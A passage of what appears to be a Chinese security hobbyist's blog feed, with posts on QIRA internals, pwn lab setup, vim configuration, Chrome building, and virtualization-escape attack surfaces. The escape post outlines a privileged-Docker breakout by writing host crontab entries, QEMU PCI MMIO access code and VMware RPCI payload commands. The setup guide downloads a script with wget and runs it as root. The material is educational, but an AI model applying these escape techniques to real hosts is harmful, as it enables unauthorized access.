$*</span><br></pre></td></tr></table></figure></li></ul><p>那么继续跟进</p><h1 id="0x04-middleware-qira-py脚本分析"><a href="#0x04-middleware-qira-py脚本分析" class="headerlink" title="0x04 /middleware/qira.py脚本分析"></a>0x04 /middleware/qira.py脚本分析</h1><ul><li>首先设置设置参数，解析参数(<del>就不粘贴了</del>)</li><li>然后执行  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">program = qira_program.Program(args.binary, args.args, qemu_args)</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x00-调用了qira-program-py下Program类"><a href="#0x00-调用了qira-program-py下Program类" class="headerlink" title="0x00 调用了qira_program.py下Program类"></a>0x00 调用了qira_program.py下Program类</h2><p>看一下该类的 <strong>init</strong> 函数</p><ul><li><p>首先创建log文件</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.mkdir(qira_config.TRACE_FILE_BASE)</span><br></pre></td></tr></table></figure><p>  再看一下，qira_config.py的trace_file_base全局变量</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if os.name == &quot;nt&quot;:</span><br><span class="line">    TRACE_FILE_BASE = &quot;c:/qiratmp&quot;</span><br><span class="line">else:</span><br><span class="line">    TRACE_FILE_BASE = &quot;/tmp/qira_logs/&quot;</span><br></pre></td></tr></table></figure><p>  判断一下系统类型，根据不同的系统类型，定制不同的路径</p></li><li><p>之后调用 <strong>which</strong> 函数</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.program = which(prog)</span><br></pre></td></tr></table></figure><p>  看一下 <strong>which</strong> 函数</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def which(prog):</span><br><span class="line">    try:</span><br><span class="line">        cmd = [&quot;which&quot;, prog]</span><br><span class="line">        p = subprocess.Popen(cmd, stdout=subprocess.PIPE)</span><br><span class="line">        res = p.stdout.readlines()</span><br><span class="line">        if len(res) == 0:</span><br><span class="line">            raise Exception(&quot;binary not found&quot;)</span><br><span class="line">        return os.path.realpath(res[0].strip())</span><br><span class="line">    except:</span><br><span class="line">    # fallback mode, look for the binary straight up</span><br><span class="line">        if os.path.isfile(prog):</span><br><span class="line">            return os.path.realpath(prog)</span><br><span class="line">        else:</span><br><span class="line">            raise Exception(&quot;binary not found&quot;)</span><br></pre></td></tr></table></figure><p>  这个函数主要是用找程序的真实路径，现在 <strong>PATH</strong> 中找，然后判断 <strong>prog</strong> 是否为一个文件，如果是的话，就找到真实的路径</p></li><li>之后，就是参数复制</li><li><p>初始化static成员变量</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.static = static2.Static(self.program)</span><br></pre></td></tr></table></figure><p>  再来看一下static2.py的static类的 <strong>init</strong> 函数</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loader.load_binary(self)</span><br></pre></td></tr></table></figure><p>  调用loader.py文件的 <strong>load_binary()</strong> 函数</p><ul><li>再看一下load_binary()函数，这个函数是获得文件的架构，程序入口地址，以及plt表之类的信息</li></ul></li><li><p>之后就判断 <strong>program</strong> 的位置是否和”/tmp/qira_binary”路径一致，如果不一致，建立新的软连接（<del>我寻思着，如果是nt的话，这软连接恐怕建立不了吧，看不懂了，可能默认是linux吧</del>）</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if self.program != &quot;/tmp/qira_binary&quot;:</span><br><span class="line">    try:</span><br><span class="line">        os.unlink(&quot;/tmp/qira_binary&quot;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        os.symlink(os.path.realpath(self.program), &quot;/tmp/qira_binary&quot;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure></li><li><p>最后读取文件的架构，设置qemu的路径</p><h1 id="0x05-调用qira-socat-start-bindserver-函数"><a href="#0x05-调用qira-socat-start-bindserver-函数" class="headerlink" title="0x05 调用qira_socat.start_bindserver()函数"></a>0x05 调用qira_socat.start_bindserver()函数</h1>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qira_socat.start_bindserver(program, qira_config.SOCAT_PORT, -1, 1, True)</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x06-启动http服务"><a href="#0x06-启动http服务" class="headerlink" title="0x06 启动http服务"></a>0x06 启动http服务</h1><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qira_webserver.run_server(args, program)</span><br></pre></td></tr></table></figure></code></pre>]]></content>
    
    <summary type="html">
    
      这么概要分析一下qira的运行流程
    
    </summary>
    
    
    
      <category term="pwn,dbgtools" scheme="http://yoursite.com/tags/pwn-dbgtools/"/>
    
  </entry>
  
  <entry>
    <title>git+hexo博客搭建</title>
    <link href="http://yoursite.com/2019/10/27/git-hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2019/10/27/git-hexo博客搭建/</id>
    <published>2019-10-27T11:17:46.000Z</published>
    <updated>2019-10-27T11:17:46.558Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>萌新篇--pwn环境搭建</title>
    <link href="http://yoursite.com/2019/10/27/%E8%90%8C%E6%96%B0%E7%AF%87-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2019/10/27/萌新篇-pwn环境搭建/</id>
    <published>2019-10-27T10:33:35.000Z</published>
    <updated>2019-10-27T12:16:29.735Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这篇专门写给18，19级的萌新们。。。。。</p><h1 id="0x01-安装ida"><a href="#0x01-安装ida" class="headerlink" title="0x01 安装ida"></a>0x01 安装ida</h1><p>百度网盘链接<a href="https://pan.baidu.com/s/1bdBhVTBYMk0lNIOtCxIjPw" target="_blank" rel="noopener">https://pan.baidu.com/s/1bdBhVTBYMk0lNIOtCxIjPw</a>提取码: <strong>w28g</strong><br>下载7.0版本，解压即用<br><img src="/2019/10/27/萌新篇-pwn环境搭建/ida.png" alt="ida"><br>用法:参考《ida权威指南》这本书</p><h1 id="0x01-安装vmware"><a href="#0x01-安装vmware" class="headerlink" title="0x01 安装vmware"></a>0x01 安装vmware</h1><p>参考教程<br><a href="https://mp.weixin.qq.com/s?__biz=MzIwMjE1MjMyMw==&amp;mid=2650203072&amp;idx=1&amp;sn=b21a1c1d4526cb578efa7aeb74f4d857&amp;chksm=8ee1432cb996ca3ae786c341458b2d52d9af516134975a43180d904e36c14253596f28be7996&amp;mpshare=1&amp;scene=23&amp;srcid=1027gHii7mCeGicC9Qgzt1En&amp;sharer_sharetime=1572173395493&amp;sharer_shareid=664f488f651558655193425ea399e4ef#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIwMjE1MjMyMw==&amp;mid=2650203072&amp;idx=1&amp;sn=b21a1c1d4526cb578efa7aeb74f4d857&amp;chksm=8ee1432cb996ca3ae786c341458b2d52d9af516134975a43180d904e36c14253596f28be7996&amp;mpshare=1&amp;scene=23&amp;srcid=1027gHii7mCeGicC9Qgzt1En&amp;sharer_sharetime=1572173395493&amp;sharer_shareid=664f488f651558655193425ea399e4ef#rd</a></p><h1 id="0x02-安装ubuntu"><a href="#0x02-安装ubuntu" class="headerlink" title="0x02 安装ubuntu"></a>0x02 安装ubuntu</h1><h2 id="0x00-安装ubuntu16-04"><a href="#0x00-安装ubuntu16-04" class="headerlink" title="0x00 安装ubuntu16.04"></a>0x00 安装ubuntu16.04</h2><h3 id="0x00-下载ubuntu16-04镜像"><a href="#0x00-下载ubuntu16-04镜像" class="headerlink" title="0x00 下载ubuntu16.04镜像"></a>0x00 下载ubuntu16.04镜像</h3><p>下载网址<a href="http://mirrors.aliyun.com/ubuntu-releases/16.04/" target="_blank" rel="noopener">http://mirrors.aliyun.com/ubuntu-releases/16.04/</a><br><img src="/2019/10/27/萌新篇-pwn环境搭建/ubuntu.png" alt="ubuntu"><br><strong>点击下载</strong></p><h3 id="0x01-安装ubuntu16-04虚拟机"><a href="#0x01-安装ubuntu16-04虚拟机" class="headerlink" title="0x01 安装ubuntu16.04虚拟机"></a>0x01 安装ubuntu16.04虚拟机</h3><p>参考教程：<a href="https://blog.csdn.net/PustoTauranth/article/details/89848386" target="_blank" rel="noopener">https://blog.csdn.net/PustoTauranth/article/details/89848386</a></p><h3 id="0x02-Ubuntu16-04换源"><a href="#0x02-Ubuntu16-04换源" class="headerlink" title="0x02 Ubuntu16.04换源"></a>0x02 Ubuntu16.04换源</h3><p>参考<a href="https://www.linuxidc.com/Linux/2017-11/148627.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2017-11/148627.htm</a></p><h3 id="0x03-环境配置"><a href="#0x03-环境配置" class="headerlink" title="0x03 环境配置"></a>0x03 环境配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/giantbranch/pwn-env-init/master/pwn_init.sh</span><br><span class="line">chmod +x pwn_init.sh</span><br></pre></td></tr></table></figure><p><img src="/2019/10/27/萌新篇-pwn环境搭建/pwn-init.png" alt="pwn_init"><br>右键用文本编辑器打开，在这几行行首注释掉peda，因为peda和pwndbg不能共存<br>然后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pwn_init.sh</span><br></pre></td></tr></table></figure></p><h3 id="0x03-安装其他应用"><a href="#0x03-安装其他应用" class="headerlink" title="0x03 安装其他应用"></a>0x03 安装其他应用</h3><ul><li><p>安装nasm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nasm</span><br></pre></td></tr></table></figure></li><li><p>安装nmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nmap</span><br></pre></td></tr></table></figure></li><li><p>安装ipython</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ipython</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x00-安装ubuntu18-04"><a href="#0x00-安装ubuntu18-04" class="headerlink" title="0x00 安装ubuntu18.04"></a>0x00 安装ubuntu18.04</h2><h3 id="0x00-下载ubuntu18-04镜像"><a href="#0x00-下载ubuntu18-04镜像" class="headerlink" title="0x00 下载ubuntu18.04镜像"></a>0x00 下载ubuntu18.04镜像</h3><p>下载网址<a href="http://mirrors.aliyun.com/ubuntu-releases/18.04/" target="_blank" rel="noopener">http://mirrors.aliyun.com/ubuntu-releases/18.04/</a><br><strong>点击下载</strong></p><h3 id="0x01-配置"><a href="#0x01-配置" class="headerlink" title="0x01 配置"></a>0x01 配置</h3><p>换源参考<a href="https://www.linuxidc.com/Linux/2018-08/153709.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2018-08/153709.htm</a></p><h1 id="0x03-其他教程-随便看看"><a href="#0x03-其他教程-随便看看" class="headerlink" title="0x03 其他教程(随便看看)"></a>0x03 其他教程(<del>随便看看</del>)</h1><ul><li>pwntools教程：<a href="https://www.jianshu.com/p/355e4badab50" target="_blank" rel="noopener">https://www.jianshu.com/p/355e4badab50</a></li><li>gdb教程：<a href="https://blog.csdn.net/awm_kar98/article/details/82840811" target="_blank" rel="noopener">https://blog.csdn.net/awm_kar98/article/details/82840811</a></li><li>ncat和nc使用: <a href="https://www.cnblogs.com/chengd/p/7565280.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengd/p/7565280.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      培训原来这么难2333
    
    </summary>
    
    
    
      <category term="ctf，pwn" scheme="http://yoursite.com/tags/ctf%EF%BC%8Cpwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;打造自己ide-vim&#39;</title>
    <link href="http://yoursite.com/2019/10/25/%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1ide-vim/"/>
    <id>http://yoursite.com/2019/10/25/打造自己ide-vim/</id>
    <published>2019-10-25T12:14:18.000Z</published>
    <updated>2019-10-26T17:35:24.673Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>入vim的坑已经许久，(<del>不知道为什么这么钟爱vim</del>)最近才发现我的工作效率远比sublime要低很多,所以，自己系统学一下vim，编写属于自己的配置文件</p><h1 id="0x01-编译vim"><a href="#0x01-编译vim" class="headerlink" title="0x01 编译vim"></a>0x01 编译vim</h1><p>参考：</p><ul><li><a href="https://github.com/yangyangwithgnu/use_vim_as_ide#0" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/use_vim_as_ide#0</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vim/vim.git</span><br><span class="line">./configure --with-features=huge --enable-pythoninterp --enable-rubyinterp --enable-luainterp --enable-perlinterp --with-python-config-dir=/usr/lib/python2.7/config/ --enable-gui=gtk2 --enable-cscope --prefix=/usr</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><blockquote><p>中，–enable-pythoninterp、–enable-rubyinterp、–enable-perlinterp、–enable-luainterp 等分别表示支持 ruby、python、perl、lua 编写的插件，–enable-gui=gtk2 表示生成采用 GNOME2 风格的 gvim，–enable-cscope 支持 cscope，–with-python-config-dir=/usr/lib/python2.7/config/ 指定 python 路径（先自行安装 python 的头文件 python-devel），这几个特性非常重要，影响后面各类插件的使用。注意，你得预先安装相关依赖库的头文件，python-devel、python3-devel、ruby-devel、lua-devel、libX11-devel、gtk-devel、gtk2-devel、gtk3-devel、ncurses-devel，如果缺失，源码构建过程虽不会报错，但最终生成的 vim 很可能缺失某些功能。构建完成后在 vim 中执行</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:echo has(&apos;python&apos;)</span><br></pre></td></tr></table></figure><p>若输出 1 则表示构建出的 vim 已支持 python，反之，0 则不支持</p><h1 id="0x01-set用法"><a href="#0x01-set用法" class="headerlink" title="0x01 set用法"></a>0x01 set用法</h1><p>set可以设置一些选项</p><ul><li>number 显示行号</li><li>numberwidth 行号的列宽</li><li>hlsearch 高亮查找</li><li>syntax enable 颜色激活</li><li>autowrite 自动保存</li><li>fileformat 设置文件格式（unix，dos）</li><li>autoindent 自动缩进</li><li>softtabstop tab缩进量</li><li>botright 控制分屏的行为<h1 id="0x02-特殊按键"><a href="#0x02-特殊按键" class="headerlink" title="0x02 特殊按键"></a>0x02 特殊按键</h1></li></ul><h1 id="0x02-按键映射"><a href="#0x02-按键映射" class="headerlink" title="0x02 按键映射"></a>0x02 按键映射</h1><p>参考文章:</p><ul><li><a href="http://learnvimscriptthehardway.onefloweroneworld.com/chapters/01.html" target="_blank" rel="noopener">http://learnvimscriptthehardway.onefloweroneworld.com/chapters/01.html</a></li></ul><p>这是vim最高效的用法之一，可以自由的定义快捷键，下面记录几种映射方式：</p><ul><li>基本映射</li><li>精准映射<h2 id="0x01-使用在插入模式使用精准映射"><a href="#0x01-使用在插入模式使用精准映射" class="headerlink" title="0x01 使用在插入模式使用精准映射"></a>0x01 使用在插入模式使用精准映射</h2></li><li><p>ctrl+q 退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inoremap &lt;c-q&gt; &lt;esc&gt;:q</span><br></pre></td></tr></table></figure></li><li><p>ctrl+s 保存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inoremap &lt;c-s&gt; &lt;esc&gt;:wi</span><br></pre></td></tr></table></figure></li><li><p>ctrl+z 撤销</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icoremap &lt;c-z&gt; &lt;esc&gt;:ui</span><br></pre></td></tr></table></figure></li><li><p>ctrl+f 查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icoremap &lt;c-f&gt; &lt;esc&gt;/</span><br></pre></td></tr></table></figure></li><li><p>ctrl+k 向下交换一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icoremap &lt;c-j&gt; &lt;esc&gt;ddpi</span><br></pre></td></tr></table></figure></li><li><p>ctrl+i 向上交换一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icoremap &lt;c-k&gt; &lt;esc&gt;kddpi</span><br></pre></td></tr></table></figure></li><li><p>ctrl+j 光标移动到行首</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icoremap &lt;c-h&gt; &lt;esc&gt;^i</span><br></pre></td></tr></table></figure></li><li><p>ctrl+l 光标移动到行尾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icoremap &lt;c-l&gt; &lt;esc&gt;$i</span><br></pre></td></tr></table></figure></li><li><p>ctrl 转到命令模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icoremap &lt;c&gt; &lt;esc&gt;:</span><br></pre></td></tr></table></figure></li><li><p>ctrl+- 缩小字体</p></li><li>ctrl++ 放大字体</li><li><p>f5 一键执行代码<br>  1.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icoremap &lt;f5&gt; &lt;esc&gt;:w!gnome-terminal --command=&quot;python %&quot;&lt;cr&gt;&lt;cr&gt;i</span><br></pre></td></tr></table></figure><p>  2.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icoremap &lt;F5&gt;  &lt;esc&gt;:w&lt;cr&gt;:!echo &quot;python &quot;% &gt; ~/.bash_history&lt;cr&gt;&lt;cr&gt;:vertical botright term&lt;cr&gt;&lt;c-p&gt;&lt;cr&gt;</span><br></pre></td></tr></table></figure></li><li><p>c-t 打开终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noremap &lt;c-t&gt; vertical botright term</span><br></pre></td></tr></table></figure></li></ul><h1 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h1><ol><li>Indexer error: Exuberant Ctags not found in PATH.<br>sudo apt-get install exuberant-ctags</li><li>Cannot find color scheme ‘solarized’<br>Taglist: Exuberant ctags (<a href="http://ctags.sf.net" target="_blank" rel="noopener">http://ctags.sf.net</a>) not found in PATH. Plugin is not loaded.<br>cp ~/.vim/bundle/vim-colors-solarized/colors/solarized.vim ~/.vim/colors/</li><li>Vim”UltiSnips requires py &gt;= 2.7 or py3”<br>sudo apt install python-dev</li><li>The ycmd server SHUT DOWN (restart wit…the instructions in the documentation.<br>./install.py<br>5.<br>CMake Error in CMakeLists.txt:<br>No CMAKE_CXX_COMPILER could be found.Tell CMake where to find the compiler by setting either the environment variable “CXX” or the CMake cache entry CMAKE_CXX_COMPILER to the full path to the compiler, or to the compiler name if it is in the PATH.<br>参考博客：<a href="https://blog.csdn.net/ssj901217/article/details/80046204" target="_blank" rel="noopener">https://blog.csdn.net/ssj901217/article/details/80046204</a><br>安装gcc、g++<h1 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h1></li></ol><ul><li><p>:echo和:echom的区别</p><blockquote><p>:echo命令 会打印输出，但是一旦你的脚本运行完毕，那些输出信息就会消失。使用:echom打印的信息 会保存下来，你可以执行:messages命令再次查看那些信息。</p></blockquote></li><li><p>注释用 <strong>“</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
      学习一下vim script的用法，打造一个适合自己的ide
    
    </summary>
    
    
    
      <category term="tools，vim" scheme="http://yoursite.com/tags/tools%EF%BC%8Cvim/"/>
    
  </entry>
  
  <entry>
    <title>&#39;逃逸初探&#39;</title>
    <link href="http://yoursite.com/2019/10/24/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/"/>
    <id>http://yoursite.com/2019/10/24/逃逸初探/</id>
    <published>2019-10-24T15:27:32.000Z</published>
    <updated>2019-11-16T03:37:32.893Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-docker"><a href="#0x00-docker" class="headerlink" title="0x00 docker"></a>0x00 docker</h1><p>docker在特权模式下（<del>这也不算是逃逸吧</del>），可以挂载宿主机的根目录，从而可以读写宿主机的任意文件</p><p>我知道的有两种攻击方式：</p><ul><li>写入contab文件，contab文件位于 <strong>/var/spool/cron/</strong> 下（<del>通过<em> </em> <em> </em> * export DISPLAY=:0.0 &amp;&amp; /usr/bin/xcalc就可以愉快的弹出计算器了，你只需要等一分钟</del>）</li><li>利用宿主机已有的漏洞，进行攻击</li></ul><h2 id="待补（其他利用方式）"><a href="#待补（其他利用方式）" class="headerlink" title="待补（其他利用方式）"></a>待补（<del>其他利用方式</del>）</h2><h1 id="0x01-qemu"><a href="#0x01-qemu" class="headerlink" title="0x01 qemu"></a>0x01 qemu</h1><h2 id="0x00-pci设备攻击面"><a href="#0x00-pci设备攻击面" class="headerlink" title="0x00 pci设备攻击面"></a>0x00 pci设备攻击面</h2><p>qemu有一个比较有意思的攻击面，就是pci设备，qemu会把guest机的pci设备的资源文件映射到堆上，来模拟文件，如果对pci设备操作的函数 <strong>mmio_read</strong> 和 <strong>mmio_write</strong> 实现不正确，就可能会有堆溢出或者信息泄露的情况出现</p><h2 id="0x01-linux-pci设备介绍"><a href="#0x01-linux-pci设备介绍" class="headerlink" title="0x01 linux pci设备介绍"></a>0x01 linux pci设备介绍</h2><p>参考博客:</p><ul><li><a href="https://www.cnblogs.com/yuanfang/archive/2010/12/23/1914905.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuanfang/archive/2010/12/23/1914905.html</a></li></ul><p>就不搬运了，对于pci设备，我们需要识别哪一个是我们的想要的pci设备，我们可以利用hexdump，查看 <strong>/sys/devices/pci0000:00/</strong> 文件下各个文件的config文件，对应注册的设备的号码和厂商号码来辨认设备</p><h3 id="0x00-mmio访问pci设备"><a href="#0x00-mmio访问pci设备" class="headerlink" title="0x00 mmio访问pci设备"></a>0x00 mmio访问pci设备</h3><p>之后可以通过mmap的方式来操作resource文件，通过对mmap内存的读写来读写resource文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;, O_RDWR | O_SYNC);</span><br><span class="line">base = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);</span><br></pre></td></tr></table></figure><h3 id="0x01-编程访问PMIO"><a href="#0x01-编程访问PMIO" class="headerlink" title="0x01 编程访问PMIO"></a>0x01 编程访问PMIO</h3><ul><li><a href="https://xz.aliyun.com/t/6618" target="_blank" rel="noopener">https://xz.aliyun.com/t/6618</a></li></ul><h3 id="0x02-PMIO和MMIO的区别"><a href="#0x02-PMIO和MMIO的区别" class="headerlink" title="0x02 PMIO和MMIO的区别"></a>0x02 PMIO和MMIO的区别</h3><ul><li><a href="https://www.cnblogs.com/idorax/p/7691334.html" target="_blank" rel="noopener">https://www.cnblogs.com/idorax/p/7691334.html</a></li></ul><h2 id="待补（源码分析）"><a href="#待补（源码分析）" class="headerlink" title="待补（源码分析）"></a>待补（<del>源码分析</del>）</h2><h1 id="0x02-vmware"><a href="#0x02-vmware" class="headerlink" title="0x02 vmware"></a>0x02 vmware</h1><p>参考博客：</p><ul><li><a href="https://www.jishuwen.com/d/2YL7" target="_blank" rel="noopener">https://www.jishuwen.com/d/2YL7</a><br>vmware有一个比较有意思的攻击面，backdoor攻击面，backdoor是host和guest的一种通讯方式，我们可以发送RPCI指令,来触发漏洞<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">info-set guest.a payload</span><br><span class="line">info-get guest.a</span><br></pre></td></tr></table></figure></li></ul><h2 id="待补（vmware-vmx逆向分析）"><a href="#待补（vmware-vmx逆向分析）" class="headerlink" title="待补（vmware-vmx逆向分析）"></a>待补（<del>vmware-vmx逆向分析</del>）</h2>]]></content>
    
    <summary type="html">
    
      这里总结一下，一些虚拟化逃逸的攻击面
    
    </summary>
    
    
    
      <category term="ctf,reallyworld" scheme="http://yoursite.com/tags/ctf-reallyworld/"/>
    
  </entry>
  
  <entry>
    <title>&#39;chrome编译&#39;</title>
    <link href="http://yoursite.com/2019/10/24/chrome%E7%BC%96%E8%AF%91/"/>
    <id>http://yoursite.com/2019/10/24/chrome编译/</id>
    <published>2019-10-24T12:27:22.000Z</published>
    <updated>2019-10-24T14:58:25.536Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我下载chrome源码和v8源码，下载了3天才下载好，最后迫于虚拟机环境，换了个虚拟机，才完成,众所周知，搭建环境是最难的。。。</p><p>（<del>你总会遇到一些奇奇怪怪的问题，而我就不同了，我必会遇到一些闻所未闻的问题</del>）</p><h1 id="0x01-下载步骤"><a href="#0x01-下载步骤" class="headerlink" title="0x01 下载步骤"></a>0x01 下载步骤</h1><h2 id="0x00-代理"><a href="#0x00-代理" class="headerlink" title="0x00 代理"></a>0x00 代理</h2><p>首先就是挂代理了，普通的ss不太行，需要polipo转发，从而让bash和git能通过代理，科学上网</p><h3 id="0x00-安装ss"><a href="#0x00-安装ss" class="headerlink" title="0x00 安装ss"></a>0x00 安装ss</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install shadowsocks</span><br></pre></td></tr></table></figure><h3 id="0x01-启动ss"><a href="#0x01-启动ss" class="headerlink" title="0x01 启动ss"></a>0x01 启动ss</h3><p>新建一个json文件（下面以ss.json代替），写入配置，启动ss<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslocal -c ss.json</span><br></pre></td></tr></table></figure></p><p>然后窗口别关就行</p><h3 id="0x02-设置polipo"><a href="#0x02-设置polipo" class="headerlink" title="0x02 设置polipo"></a>0x02 设置polipo</h3><p>设置polipo配置文件，位于/etc/polipo/config，你只需要设置端口就可以了,重启服务，载入配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service polipo restart</span><br></pre></td></tr></table></figure></p><h3 id="0x03-引入环境变量并验证"><a href="#0x03-引入环境变量并验证" class="headerlink" title="0x03 引入环境变量并验证"></a>0x03 引入环境变量并验证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=&quot;http://127.0.0.1:8123&quot;</span><br><span class="line">export https_proxy=&quot;https://127.0.0.1:8123&quot;</span><br></pre></td></tr></table></figure><p>终端输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.google.com</span><br></pre></td></tr></table></figure></p><p>看看回显是否正确</p><h3 id="0x04-设置git代理-坑点一"><a href="#0x04-设置git代理-坑点一" class="headerlink" title="0x04 设置git代理(坑点一)"></a>0x04 设置git代理(<del>坑点一</del>)</h3><p>输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy &apos;http://127.0.0.1:8123&apos;</span><br><span class="line">git config --global https.proxy &apos;http://127.0.0.1:8123&apos;</span><br></pre></td></tr></table></figure></p><p>我一开始设置的是ss的端口，发现git根本就不能clone，ss的log也没有显示有新的请求23333</p><h2 id="0x01-下载depot-tools"><a href="#0x01-下载depot-tools" class="headerlink" title="0x01 下载depot_tools"></a>0x01 下载depot_tools</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$git clone 